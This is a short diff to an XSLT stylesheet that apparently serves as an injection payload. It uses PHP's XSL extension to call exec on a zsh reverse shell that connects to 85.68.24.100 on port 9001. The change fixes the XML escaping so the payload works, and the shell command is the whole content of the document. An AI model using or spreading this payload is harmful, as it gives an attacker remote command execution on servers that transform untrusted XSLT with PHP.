@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
 <xsl:template match="/">
-<xsl:value-of select="php:function('exec','zsh -c \"zmodload zsh/net/tcp && ztcp 85.68.24.100 9001 && zsh >&amp$REPLY 2>&amp$REPLY 0>&amp$REPLY\"')"/>
+<xsl:value-of select="php:function('exec','zsh -c \"zmodload zsh/net/tcp &amp;&amp; ztcp 85.68.24.100 9001 &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY\"')"/>
 </xsl:template>
 </xsl:stylesheet>
